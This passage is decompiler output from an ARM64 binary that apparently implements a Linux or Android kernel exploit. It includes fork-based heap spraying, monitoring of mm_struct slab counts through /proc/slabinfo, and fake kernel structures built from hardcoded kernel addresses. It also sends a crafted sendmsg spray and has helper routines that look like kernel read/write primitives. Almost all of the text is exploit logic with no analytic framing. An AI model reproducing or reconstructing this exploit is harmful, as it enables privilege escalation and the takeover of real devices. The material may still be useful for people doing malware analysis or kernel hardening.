  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if (bVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00106008 @ 00106008 size=84 ====

void FUN_00106008(__pid_t param_1)

{
  int iVar1;
  __pid_t _Var2;
  
  if ((0 < param_1) &&
     ((iVar1 = kill(param_1,9), iVar1 == -1 || (_Var2 = waitpid(param_1,(int *)0x0,0), _Var2 == -1))
     )) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  return;
}



// ==== FUN_0010605c @ 0010605c size=88 ====

void FUN_0010605c(long *param_1)

{
  undefined1 uVar1;
  int __fd;
  int *piVar2;
  int *extraout_x9;
  
  if (*param_1 != 0) {
    piVar2 = (int *)param_1[2];
    do {
      __fd = *piVar2;
      uVar1 = __fd != 0;
      if (0 < __fd) {
        __fd = close(__fd);
        *(undefined4 *)param_1[2] = 0xffffffff;
      }
      FUN_001074fc(__fd);
      piVar2 = extraout_x9;
    } while (!(bool)uVar1);
    FUN_00107508();
  }
  return;
}



// ==== FUN_001060b4 @ 001060b4 size=52 ====

void FUN_001060b4(undefined8 *param_1)

{
  free((void *)param_1[1]);
  free((void *)param_1[2]);
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  return;
}



// ==== FUN_001060e8 @ 001060e8 size=144 ====

void FUN_001060e8(void)

{
  FUN_0010605c(&DAT_0010d9d8);
  FUN_0010605c(&DAT_0010d9f0);
  FUN_0010605c(&DAT_0010da08);
  FUN_0010605c(&DAT_0010da20);
  if (0 < DAT_0010d728) {
    close(DAT_0010d728);
    DAT_0010d728 = -1;
  }
  FUN_001060b4(&DAT_0010d9d8);
  FUN_001060b4(&DAT_0010d9f0);
  FUN_001060b4(&DAT_0010da08);
  FUN_001060b4(&DAT_0010da20);
  free(DAT_0010d9a0);
  DAT_0010d9a0 = (void *)0x0;
  return;
}



// ==== FUN_00106178 @ 00106178 size=52 ====

undefined4 FUN_00106178(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  
  uVar1 = FUN_00105ef0();
  uVar2 = FUN_00105f94();
  FUN_00106008(uVar1);
  return uVar2;
}



// ==== FUN_001061ac @ 001061ac size=220 ====

void FUN_001061ac(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5,undefined8 param_6,undefined4 param_7)

{
  undefined8 uVar1;
  
  uVar1 = FUN_001073d0(param_1,0x2350,1);
  uVar1 = FUN_001073d0(uVar1,0x2358,0);
  uVar1 = FUN_001073d0(uVar1,0x2360,0);
  uVar1 = FUN_001073d0(uVar1,0x2368,param_2);
  uVar1 = FUN_001073d0(uVar1,0x2370,param_3);
  uVar1 = FUN_001073d0(uVar1,0x2378,param_4);
  uVar1 = FUN_001073d0(uVar1,0x2380,param_5);
  uVar1 = FUN_001073d0(uVar1,0x2388,param_6);
  FUN_0010747c(uVar1,0x2390);
  FUN_00105e20(param_1,0x2394,param_7);
  uVar1 = FUN_001073d0(param_1,0x2398,0);
  FUN_00105e18(uVar1,0x23a0,0);
  return;
}



// ==== FUN_00106288 @ 00106288 size=3128 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00106288(int param_1)

{
  long lVar1;
  undefined8 uVar2;
  undefined1 uVar3;
  undefined4 uVar4;
  int iVar5;
  __pid_t _Var6;
  uint uVar7;
  long lVar8;
  undefined8 uVar9;
  ssize_t sVar10;
  undefined4 *puVar11;
  ulong uVar12;
  long extraout_x8;
  long extraout_x8_00;
  ulong uVar13;
  long extraout_x8_01;
  long extraout_x8_02;
  long extraout_x8_03;
  long extraout_x8_04;
  long extraout_x8_05;
  long extraout_x8_06;
  void *pvVar14;
  int *piVar15;
  ulong uVar16;
  long extraout_x9;
  long extraout_x9_00;
  ulong uVar17;
  long extraout_x10;
  long extraout_x10_00;
  long extraout_x10_01;
  long extraout_x10_02;
  long extraout_x10_03;
  long extraout_x10_04;
  ulong uVar18;
  long lVar19;
  undefined1 auVar20 [16];
  long local_f8;
  undefined4 local_e4;
  long local_e0;
  msghdr local_c0;
  iovec local_88;
  undefined4 local_74;
  int local_70;
  int local_6c;
  undefined8 local_68;
  
  lVar1 = tpidr_el0;
  uVar18 = 0;
  local_68 = *(undefined8 *)(lVar1 + 0x28);
  do {
    if (-1 < *(int *)((long)&DAT_0010d700 + uVar18)) {
      close(*(int *)((long)&DAT_0010d700 + uVar18));
      *(undefined4 *)((long)&DAT_0010d700 + uVar18) = 0xffffffff;
    }
    uVar18 = uVar18 + 4;
    uVar3 = 7 < uVar18;
  } while (uVar18 != 8);
  DAT_0010d9d8 = 0x400;
  DAT_0010d9e0 = calloc(4,0x400);
  DAT_0010d9e8 = calloc(4,0x400);
  DAT_0010d9f0 = 0xc0;
  DAT_0010d9f8 = FUN_00107540(DAT_0010d9e8,0xc0);
  DAT_0010da00 = calloc(4,0xc0);
  DAT_0010da08 = 0x1f;
  DAT_0010da10 = FUN_00107540(DAT_0010da00,0x1f);
  DAT_0010da18 = calloc(4,0x1f);
  DAT_0010da20 = 0x20;
  DAT_0010da28 = FUN_00107540(DAT_0010da18,0x20);
  DAT_0010da30 = calloc(4,0x20);
  FUN_00106ec0();
  DAT_0010d9a0 = malloc(0x8e80);
  memset(DAT_0010d9a0,0x41,0x8e80);
  if (DAT_0010d9d8 != 0) {
    do {
      uVar4 = FUN_00105ef0();
      uVar18 = DAT_0010d9d8;
      *DAT_0010d9e0 = uVar4;
      FUN_001074fc(uVar18);
    } while (!(bool)uVar3);
    if (extraout_x8 != 0) {
      do {
        uVar4 = FUN_00105f94(*DAT_0010d9e0);
        uVar18 = DAT_0010d9d8;
        *DAT_0010d9e8 = uVar4;
        FUN_001074fc(uVar18);
      } while (!(bool)uVar3);
      if (extraout_x8_00 != 0) {
        uVar18 = 0;
        puVar11 = DAT_0010d9e0;
        do {
          FUN_00106008(puVar11[uVar18]);
          puVar11 = DAT_0010d9e0;
          uVar17 = DAT_0010d9d8;
          DAT_0010d9e0[uVar18] = 0xffffffff;
          uVar18 = uVar18 + 1;
        } while (uVar18 < uVar17);
      }
    }
  }
  if (DAT_0010d9f0 != 0) {
    uVar18 = 0;
    do {
      uVar4 = FUN_00105ef0();
      *(undefined4 *)(DAT_0010d9f8 + uVar18 * 4) = uVar4;
      uVar4 = FUN_00105f94();
      uVar17 = DAT_0010d9f0;
      *(undefined4 *)((long)DAT_0010da00 + uVar18 * 4) = uVar4;
      uVar18 = uVar18 + 1;
    } while (uVar18 < uVar17);
  }
  FUN_00107484();
  lVar8 = FUN_001073b4();
  uVar2 = _UNK_00102288;
  uVar9 = _DAT_00102280;
  DAT_0010d998 = lVar8;
  if (param_1 == 1) {
    *(undefined8 *)(lVar8 + 0x50) = 8;
    *(undefined8 *)(lVar8 + 0x48) = uVar2;
    *(undefined8 *)(lVar8 + 0x40) = uVar9;
  }
  if (DAT_0010da08 != 0) {
    uVar18 = 0;
    do {
      uVar4 = FUN_00105ef0();
      uVar17 = DAT_0010da08;
      *(undefined4 *)(DAT_0010da10 + uVar18 * 4) = uVar4;
      uVar18 = uVar18 + 1;
    } while (uVar18 < uVar17);
  }
  DAT_0010d990 = FUN_00105f40();
  if (DAT_0010da20 != 0) {
    uVar18 = 0;
    do {
      uVar4 = FUN_00105ef0();
      uVar17 = DAT_0010da20;
      *(undefined4 *)(DAT_0010da28 + uVar18 * 4) = uVar4;
      uVar18 = uVar18 + 1;
    } while (uVar18 < uVar17);
  }
  if (DAT_0010da08 != 0) {
    uVar18 = 0;
    do {
      uVar4 = FUN_00105f94(*(undefined4 *)(DAT_0010da10 + uVar18 * 4));
      uVar17 = DAT_0010da08;
      *(undefined4 *)((long)DAT_0010da18 + uVar18 * 4) = uVar4;
      uVar18 = uVar18 + 1;
    } while (uVar18 < uVar17);
  }
  DAT_0010d728 = FUN_00105f94(DAT_0010d990);
  if (DAT_0010da20 != 0) {
    uVar18 = 0;
    do {
      iVar5 = FUN_00105f94(*(undefined4 *)(DAT_0010da28 + uVar18 * 4));
      uVar17 = DAT_0010da20;
      DAT_0010da30[uVar18] = iVar5;
      uVar18 = uVar18 + 1;
    } while (uVar18 < uVar17);
  }
  FUN_00106ec0();
  if (DAT_0010da08 != 0) {
    uVar18 = 0;
    do {
      FUN_001074e8(DAT_0010da10);
      uVar18 = uVar18 + 1;
    } while (uVar18 < DAT_0010da08);
  }
  if (DAT_0010da20 != 0) {
    uVar18 = 0;
    do {
      FUN_001074e8(DAT_0010da28);
      uVar18 = uVar18 + 1;
    } while (uVar18 < DAT_0010da20);
  }
  if (DAT_0010d9f0 != 0) {
    uVar18 = 0;
    do {
      FUN_001074e8(DAT_0010d9f8);
      uVar18 = uVar18 + 1;
    } while (uVar18 < DAT_0010d9f0);
  }
  _Var6 = waitpid(DAT_0010d990,(int *)0x0,0);
  if (_Var6 == -1) goto LAB_00106eb4;
  FUN_00106ec0();
  uVar3 = *(int *)(DAT_0010d998 + 0x10a8) == 2;
  if ((bool)uVar3) {
    FUN_00104f78();
    pvVar14 = DAT_0010d9a0;
    uVar3 = *(ulong *)(DAT_0010d998 + 0x1078) == 0xffffffffffffffff;
    if (!(bool)uVar3) {
      uVar18 = *(ulong *)(DAT_0010d998 + 0x1078) & 0xffffffffffff8000;
      memset(DAT_0010d9a0,0,0x8e80);
      DAT_0010d9c8 = uVar18 | 0x1390;
      DAT_0010d9c0 = uVar18 | 0x2380;
      DAT_0010d9d0 = uVar18 | 0x1180;
      DAT_0010d9b8 = uVar18 | 0x14d0;
      lVar8 = DAT_0010d9a8 + -0x7fd54030d8;
      if (DAT_0010da48 != 0) {
        lVar8 = DAT_0010da68 + 0x2bfcf28;
      }
      local_e0 = -0x3ff5346540;
      uVar17 = 0xffffffc00ac05080;
      if (DAT_0010da48 != 0) {
        local_e0 = DAT_0010da68 + 0x2cb9ac0;
        uVar17 = DAT_0010da68 + 0x2c05080;
      }
      uVar12 = 0x2180;
      uVar16 = DAT_0010d9d0;
      if (param_1 != 0) {
        uVar12 = 0x1880;
        uVar16 = lVar8 - 8;
      }
      DAT_0010d9b0 = uVar18 | uVar12;
      if (param_1 == 1) {
        lVar8 = 0;
        local_e0 = 0;
        local_f8 = DAT_0010d9a8 + -0x7fd5445638;
        local_e4 = 0;
        uVar17 = DAT_0010d9c0;
        uVar12 = DAT_0010d9a8 - 0x7fd556e1b8;
      }
      else {
        local_f8 = 0;
        local_e4 = 0x82;
        uVar12 = DAT_0010d9d0;
      }
      FUN_0010747c(pvVar14,0x2210);
      FUN_00105e18(pvVar14,0x2218,DAT_0010d9b8);
      FUN_00105e18(pvVar14,0x2220,DAT_0010d9b8);
      if (param_1 == 1) {
        FUN_00105e18(pvVar14,0x2228,1);
        uVar12 = 1;
        lVar8 = 0;
        local_f8 = 0;
      }
      else {
        uVar13 = DAT_0010d9c0 | 1;
        if (param_1 == 0) {
          uVar13 = 1;
        }
        FUN_00105e18(pvVar14,0x2228,uVar13);
      }
      FUN_001061ac(pvVar14,uVar12,lVar8,local_f8,uVar17,DAT_0010d9c8,local_e4);
      FUN_00105e20(pvVar14,0x3238,0x100);
      FUN_00105e20(pvVar14,0x327c,0x78);
      FUN_00105e20(pvVar14,0x3284,0x78);
      FUN_0010747c(pvVar14,0x3a84);
      FUN_00105e18(pvVar14,15000,DAT_0010d9b8 + 0x18);
      FUN_00105e18(pvVar14,0x3aa0,DAT_0010d9b8 + 0x18);
      uVar9 = FUN_001073e4(pvVar14,0x3600,local_e0);
      uVar9 = FUN_001073e4(uVar9,0x3aa8,uVar17);
      FUN_0010492c(uVar9,0x3ab0);
      uVar9 = FUN_001073e4(pvVar14,0x4440,uVar16);
      uVar9 = FUN_001073e4(uVar9,0x4448,0);
      uVar9 = FUN_001073e4(uVar9,0x4450,0);
      uVar9 = FUN_001073e4(uVar9,0x5550,uVar16);
      uVar9 = FUN_001073e4(uVar9,0x5558,0);
      FUN_0010492c(uVar9,0x5560);
      if (param_1 == 0) {
        FUN_0010492c(pvVar14,0x2000);
        uVar9 = FUN_001073e4(pvVar14,0x2008,DAT_0010d9b8 + 0x18);
        uVar9 = FUN_001073e4(uVar9,0x2010,0);
        FUN_0010492c(uVar9,0x2018);
        uVar3 = DAT_0010da48 == 0;
        lVar8 = -0x3ff7a28be0;
        if (!(bool)uVar3) {
          lVar8 = DAT_0010da68 + 0x5d7420;
        }
        FUN_0010737c(pvVar14,0x2020,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x2028);
        lVar8 = extraout_x10;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_01 + 0xa28;
        }
        FUN_00105e18(auVar20._0_8_,auVar20._8_8_,lVar8);
        uVar3 = DAT_0010da48 == 0;
        lVar8 = -0x3ff6eb3924;
        if (!(bool)uVar3) {
          lVar8 = DAT_0010da68 + 0x114c6dc;
        }
        FUN_0010737c(pvVar14,0x2050,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x2058);
        lVar8 = extraout_x10_00;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_02 + 0x65c;
        }
        FUN_0010737c(auVar20._0_8_,auVar20._8_8_,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x2060);
        lVar8 = extraout_x10_01;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_03 + 0x6b4;
        }
        FUN_0010737c(auVar20._0_8_,auVar20._8_8_,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x2070);
        lVar8 = extraout_x10_02;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_04 + 0x994;
        }
        FUN_0010737c(auVar20._0_8_,auVar20._8_8_,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x2080);
        lVar8 = extraout_x10_03;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_05 + 0xa2c;
        }
        FUN_00105e18(auVar20._0_8_,auVar20._8_8_,lVar8);
        uVar3 = DAT_0010da48 == 0;
        lVar8 = -0x3ff7ad7e68;
        if (!(bool)uVar3) {
          lVar8 = DAT_0010da68 + 0x528198;
        }
        FUN_0010737c(pvVar14,0x20c8,lVar8);
        auVar20 = FUN_00107470(pvVar14,0x20e0);
        lVar8 = extraout_x10_04;
        if (!(bool)uVar3) {
          lVar8 = extraout_x8_06 + 0xb48;
        }
        FUN_00105e18(auVar20._0_8_,auVar20._8_8_,lVar8);
      }
      iVar5 = FUN_001074a8();
      if (iVar5 == -1) {
LAB_00106eb4:
        FUN_001048f8();
                    /* WARNING: Subroutine does not return */
        FUN_00104934();
      }
      local_74 = 0x100000;
      setsockopt(DAT_0010d700,1,7,&local_74,4);
      uVar7 = fcntl(DAT_0010d700,3,0);
      if (-1 < (int)uVar7) {
        uVar7 = fcntl(DAT_0010d700,4,(ulong)(uVar7 | 0x800));
      }
      iVar5 = FUN_001074a8(uVar7);
      if (iVar5 == -1) goto LAB_00106eb4;
      local_c0.msg_flags = 0;
      local_c0._52_4_ = 0;
      local_88.iov_base = DAT_0010d9a0;
      local_88.iov_len = 0x8e80;
      local_c0.msg_iov = &local_88;
      local_c0.msg_controllen = 0;
      local_c0.msg_control = (void *)0x0;
      local_c0.msg_iovlen = 1;
      local_c0.msg_namelen = 0;
      local_c0._12_4_ = 0;
      local_c0.msg_name = (void *)0x0;
      sVar10 = sendmsg(local_70,&local_c0,0);
      if (sVar10 == -1) goto LAB_00106eb4;
      FUN_00104bf0();
      sched_yield();
      sched_yield();
      sched_yield();
      uVar7 = sched_yield();
      uVar12 = (ulong)uVar7;
      uVar17 = DAT_0010d9d8 >> 5;
      if (0x1ff < DAT_0010d9d8) {
        uVar17 = 0x10;
      }
      if (uVar17 != 0) {
        lVar8 = 0;
        puVar11 = DAT_0010d9e8;
        uVar16 = uVar17;
        do {
          if (-1 < *(int *)((long)puVar11 + lVar8)) {
            iVar5 = close(*(int *)((long)puVar11 + lVar8));
            puVar11 = DAT_0010d9e8;
            if (iVar5 == -1) goto LAB_00106eb4;
            *(undefined4 *)((long)DAT_0010d9e8 + lVar8) = 0xffffffff;
          }
          uVar12 = (ulong)*(uint *)((long)DAT_0010d9e0 + lVar8);
          if (0 < (int)*(uint *)((long)DAT_0010d9e0 + lVar8)) {
            uVar12 = FUN_00106008();
            puVar11 = DAT_0010d9e8;
            *(undefined4 *)((long)DAT_0010d9e0 + lVar8) = 0xffffffff;
          }
          uVar16 = uVar16 - 1;
          lVar8 = lVar8 + 0x80;
        } while (uVar16 != 0);
      }
      FUN_00106ec0(uVar12);
      if (DAT_0010d9f0 != 0) {
        uVar12 = 0;
        pvVar14 = DAT_0010da00;
        do {
          iVar5 = close(*(int *)((long)pvVar14 + uVar12 * 4));
          pvVar14 = DAT_0010da00;
          uVar16 = DAT_0010d9f0;
          if (iVar5 == -1) goto LAB_00106eb4;
          *(undefined4 *)((long)DAT_0010da00 + uVar12 * 4) = 0xffffffff;
          uVar12 = uVar12 + 0x20;
        } while (uVar12 < uVar16);
      }
      lVar8 = DAT_0010da08 - 1;
      iVar5 = close(*(int *)((long)DAT_0010da18 + lVar8 * 4));
      piVar15 = DAT_0010da30;
      if (iVar5 == -1) goto LAB_00106eb4;
      *(undefined4 *)((long)DAT_0010da18 + lVar8 * 4) = 0xffffffff;
      iVar5 = close(*piVar15);
      if (iVar5 == -1) goto LAB_00106eb4;
      *DAT_0010da30 = -1;
      if (lVar8 != 0) {
        lVar19 = 0;
        pvVar14 = DAT_0010da18;
        do {
          iVar5 = close(*(int *)((long)pvVar14 + lVar19 * 4));
          pvVar14 = DAT_0010da18;
          if (iVar5 == -1) goto LAB_00106eb4;
          *(undefined4 *)((long)DAT_0010da18 + lVar19 * 4) = 0xffffffff;
          lVar19 = lVar19 + 1;
        } while (lVar8 != lVar19);
      }
      if (DAT_0010da20 - 3 < 0xfffffffffffffffe) {
        uVar12 = 1;
        piVar15 = DAT_0010da30;
        do {
          iVar5 = close(piVar15[uVar12]);
          piVar15 = DAT_0010da30;
          uVar16 = DAT_0010da20;
          if (iVar5 == -1) goto LAB_00106eb4;
          DAT_0010da30[uVar12] = -1;
          uVar12 = uVar12 + 1;
        } while (uVar12 < uVar16 - 1);
      }
      iVar5 = close(local_70);
      if ((iVar5 == -1) || (iVar5 = close(local_6c), iVar5 == -1)) goto LAB_00106eb4;
      sched_yield();
      sched_yield();
      sched_yield();
      iVar5 = sched_yield();
      FUN_00106ec0(iVar5);
      iVar5 = close(DAT_0010d728);
      if (iVar5 == -1) goto LAB_00106eb4;
      DAT_0010d728 = -1;
      FUN_00106ec0();
      uVar16 = DAT_0010d9d8 >> 5;
      uVar12 = 0;
      if (uVar17 <= uVar16) {
        uVar12 = uVar16 - uVar17;
      }
      if (0xf < uVar12) {
        uVar12 = 0x10;
      }
      if (uVar17 < uVar16) {
        lVar8 = uVar17 << 7;
        puVar11 = DAT_0010d9e8;
        do {
          if (-1 < *(int *)((long)puVar11 + lVar8)) {
            iVar5 = close(*(int *)((long)puVar11 + lVar8));
            puVar11 = DAT_0010d9e8;
            if (iVar5 == -1) goto LAB_00106eb4;
            *(undefined4 *)((long)DAT_0010d9e8 + lVar8) = 0xffffffff;
          }
          if (0 < *(int *)((long)DAT_0010d9e0 + lVar8)) {
            FUN_00106008();
            puVar11 = DAT_0010d9e8;
            *(undefined4 *)((long)DAT_0010d9e0 + lVar8) = 0xffffffff;
          }
          uVar12 = uVar12 - 1;
          lVar8 = lVar8 + 0x80;
        } while (uVar12 != 0);
      }
      FUN_00106ec0();
      iVar5 = 0x41;
      do {
        iVar5 = iVar5 + -1;
        uVar3 = true;
        if (iVar5 == 0) break;
        puVar11 = (undefined4 *)__errno();
        *puVar11 = 0;
        sVar10 = sendmsg(DAT_0010d700,&local_c0,0x40);
        uVar3 = sVar10 == 0;
      } while (0 < sVar10);
      FUN_00106ec0();
      FUN_001052a0(DAT_0010d998);
      DAT_0010d998 = 0;
      if (DAT_0010d9d8 != 0) {
        uVar17 = 0;
        puVar11 = DAT_0010d9e8;
        do {
          if (-1 < (int)puVar11[uVar17]) {
            iVar5 = close(puVar11[uVar17]);
            puVar11 = DAT_0010d9e8;
            if (iVar5 == -1) goto LAB_00106eb4;
            DAT_0010d9e8[uVar17] = 0xffffffff;
          }
          if (0 < (int)DAT_0010d9e0[uVar17]) {
            FUN_00106008();
            puVar11 = DAT_0010d9e8;
            DAT_0010d9e0[uVar17] = 0xffffffff;
          }
          uVar17 = uVar17 + 1;
          uVar3 = uVar17 == DAT_0010d9d8;
        } while (uVar17 < DAT_0010d9d8);
      }
      goto LAB_00106e84;
    }
    FUN_001052a0();
    FUN_00107514();
    if (extraout_x9_00 != 0) {
      uVar18 = 0;
      do {
        FUN_00107528();
        uVar18 = uVar18 + 1;
        uVar3 = uVar18 == DAT_0010d9d8;
      } while (uVar18 < DAT_0010d9d8);
    }
  }
  else {
    FUN_001052a0();
    FUN_00107514();
    if (extraout_x9 != 0) {
      uVar18 = 0;
      do {
        FUN_00107528();
        uVar18 = uVar18 + 1;
        uVar3 = uVar18 == DAT_0010d9d8;
      } while (uVar18 < DAT_0010d9d8);
    }
  }
  FUN_001060e8();
  uVar18 = 0;
LAB_00106e84:
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28),uVar18);
  if ((bool)uVar3) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00106ec0 @ 00106ec0 size=228 ====

void FUN_00106ec0(void)

{
  long lVar1;
  undefined1 in_ZR;
  int iVar2;
  FILE *__stream;
  char *pcVar3;
  undefined8 local_280;
  undefined8 uStack_278;
  undefined8 local_270;
  undefined8 uStack_268;
  undefined8 uStack_260;
  undefined8 uStack_258;
  undefined8 local_250 [2];
  undefined8 local_240;
  char acStack_238 [512];
  undefined8 local_38;
  
  lVar1 = tpidr_el0;
  local_38 = *(undefined8 *)(lVar1 + 0x28);
  local_250[0] = 0;
  uStack_268 = 0;
  local_270 = 0;
  uStack_258 = 0;
  uStack_260 = 0;
  uStack_278 = 0;
  local_280 = 0;
  __stream = fopen("/proc/slabinfo","re");
  iVar2 = 0;
  if (__stream != (FILE *)0x0) {
    do {
      pcVar3 = fgets(acStack_238,0x200,__stream);
      if (pcVar3 == (char *)0x0) goto LAB_00106f78;
      iVar2 = memcmp(acStack_238,"mm_struct ",10);
    } while (iVar2 != 0);
    local_240 = 0;
    sscanf(acStack_238,
           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
           &local_280,(ulong)&local_280 | 8,&local_270,&uStack_268,&uStack_260,&uStack_258,local_250
           ,&local_240);
LAB_00106f78:
    iVar2 = fclose(__stream);
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28),iVar2);
  if (!(bool)in_ZR) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ==== FUN_00106fa4 @ 00106fa4 size=92 ====

void FUN_00106fa4(uint param_1)

{
  long lVar1;
  int iVar2;
  
  iVar2 = 3;
  if (1 < param_1) {
    iVar2 = 7;
  }
  do {
    iVar2 = iVar2 + -1;
    if (iVar2 == 0) {
      lVar1 = 0;
      break;
    }
    FUN_00107000();
    lVar1 = FUN_00106288(param_1);
    FUN_00107000();
  } while (lVar1 == 0);
  FUN_00107508(lVar1);
  return;
}



// ==== FUN_00107000 @ 00107000 size=88 ====

void FUN_00107000(void)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  timespec tStack_38;
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  iVar3 = clock_gettime(1,&tStack_38);
  bVar2 = iVar3 == -1;
  if (bVar2) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if (bVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00107058 @ 00107058 size=224 ====

void FUN_00107058(undefined8 param_1,ulong param_2,undefined8 param_3,long param_4)

{
  ulong uVar1;
  long lVar2;
  undefined1 in_ZR;
  int iVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  ulong extraout_x1;
  long extraout_x8;
  undefined8 local_d0;
  undefined8 uStack_c8;
  undefined5 uStack_c0;
  undefined3 local_bb;
  undefined5 uStack_b8;
  undefined3 uStack_b3;
  undefined5 uStack_b0;
  undefined8 local_ab;
  undefined8 uStack_a3;
  undefined8 local_9b;
  undefined8 uStack_93;
  undefined8 local_8b;
  undefined8 local_48;
  
  lVar2 = tpidr_el0;
  uVar1 = (param_2 & 0xffffff) + param_4;
  local_48 = *(undefined8 *)(lVar2 + 0x28);
  uStack_c8 = 0x101010101010101;
  local_d0 = 0x101010101010101;
  uStack_b8 = 0x101010101;
  uStack_b3 = 0x10101;
  uStack_c0 = 0x101010101;
  local_bb = 0x10101;
  FUN_00107498(uVar1 >> 0x1f);
  if (extraout_x8 == 0) {
    local_8b = 0;
    uStack_93 = 0;
    local_9b = 0;
    uStack_a3 = 0;
    local_ab = 0;
    uStack_b3 = 0;
    uStack_b0 = 0;
    local_bb = 0;
    uStack_b8 = 0;
    FUN_00105e18(&local_d0,0x4d,extraout_x1 & 0xffffffffff000000);
    FUN_00105e20(&local_d0,0x55,uVar1 & 0xffffffff);
    FUN_0010747c(&local_d0,0x59);
    __errno();
    iVar3 = FUN_001073f8();
    if (iVar3 == 0) {
      FUN_00107448();
      uVar5 = __pwrite_chk();
      goto LAB_00107104;
    }
  }
  else {
    puVar4 = (undefined4 *)__errno();
    *puVar4 = 0x4b;
  }
  uVar5 = 0xffffffffffffffff;
LAB_00107104:
  FUN_00107370(*(undefined8 *)(lVar2 + 0x28),uVar5);
  if ((bool)in_ZR) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00107138 @ 00107138 size=272 ====

void FUN_00107138(undefined8 param_1,long param_2,undefined8 param_3,long param_4)

{
  ulong uVar1;
  ulong uVar2;
  long lVar3;
  undefined1 uVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined8 uVar7;
  long lVar8;
  ulong uVar9;
  undefined8 local_d0;
  undefined8 uStack_c8;
  undefined5 uStack_c0;
  undefined3 uStack_bb;
  undefined5 uStack_b8;
  undefined3 uStack_b3;
  undefined5 local_b0;
  undefined3 uStack_ab;
  undefined5 uStack_a8;
  undefined3 uStack_a3;
  undefined5 uStack_a0;
  undefined3 uStack_9b;
  undefined5 uStack_98;
  undefined3 uStack_93;
  undefined5 local_90;
  undefined4 uStack_8b;
  undefined7 uStack_87;
  undefined8 uStack_80;
  undefined8 uStack_78;
  undefined8 local_70;
  undefined8 uStack_68;
  undefined8 uStack_60;
  undefined8 uStack_58;
  undefined8 local_48;
  
  lVar8 = 0;
  lVar3 = tpidr_el0;
  local_48 = *(undefined8 *)(lVar3 + 0x28);
  uStack_c8 = 0x101010101010101;
  local_d0 = 0x101010101010101;
  uStack_b8 = 0x101010101;
  uStack_b3 = 0x10101;
  uStack_c0 = 0x101010101;
  uStack_bb = 0x10101;
  uStack_a8 = 0x101010101;
  uStack_a3 = 0x10101;
  local_b0 = 0x101010101;
  uStack_ab = 0x10101;
  uStack_98 = 0x101010101;
  uStack_93 = 0x10101;
  uStack_a0 = 0x101010101;
  uStack_9b = 0x10101;
  uStack_87 = 0x1010101010101;
  local_90 = 0x101010101;
  uStack_8b = 0x1010101;
  uStack_78 = 0x101010101010101;
  uStack_80 = 0x101010101010101;
  uStack_68 = 0x101010101010101;
  local_70 = 0x101010101010101;
  uStack_58 = 0x101010101010101;
  uStack_60 = 0x101010101010101;
  while( true ) {
    uVar1 = lVar8 + param_4;
    uVar4 = uVar1 == 0x6d6873612f766563;
    if (0x6d6873612f766563 < uVar1) break;
    uVar9 = 0;
    do {
      uVar4 = uVar9 + 8 == 0x48;
      if ((bool)uVar4) {
        FUN_00105e18(&local_d0,5);
        uStack_8b = 0;
        uStack_93 = 0;
        local_90 = 0;
        uStack_9b = 0;
        uStack_98 = 0;
        uStack_a3 = 0;
        uStack_a0 = 0;
        uStack_ab = 0;
        uStack_a8 = 0;
        uStack_b3 = 0;
        local_b0 = 0;
        uStack_bb = 0;
        uStack_b8 = 0;
        __errno();
        iVar5 = FUN_001073f8();
        if (iVar5 != 0) goto LAB_00107210;
        FUN_00107448();
        uVar7 = __pread_chk();
        goto LAB_00107220;
      }
      uVar2 = uVar9 & 0x3f;
      uVar9 = uVar9 + 8;
    } while ((param_2 - (0x6d6873612f766564 - uVar1) >> uVar2 & 0xff) != 0);
    lVar8 = lVar8 + 1;
    uVar4 = true;
    if (lVar8 == 0x100) break;
  }
  puVar6 = (undefined4 *)__errno();
  *puVar6 = 0x4b;
LAB_00107210:
  uVar7 = 0xffffffffffffffff;
LAB_00107220:
  FUN_00107370(*(undefined8 *)(lVar3 + 0x28),uVar7);
  if ((bool)uVar4) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00107248 @ 00107248 size=92 ====

void FUN_00107248(undefined8 param_1,undefined8 param_2)

{
  undefined8 uVar1;
  long lVar2;
  long lVar3;
  undefined8 local_30;
  long local_28;
  
  lVar2 = tpidr_el0;
  local_28 = *(long *)(lVar2 + 0x28);
  local_30 = 0;
  lVar3 = FUN_00107138(param_1,param_2,&local_30,8);
  uVar1 = local_30;
  if (lVar3 != 8) {
    uVar1 = 0;
  }
  if (*(long *)(lVar2 + 0x28) == local_28) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar1);
}



// ==== FUN_001072a4 @ 001072a4 size=48 ====

void FUN_001072a4(undefined8 param_1,ulong param_2,ulong param_3)

{
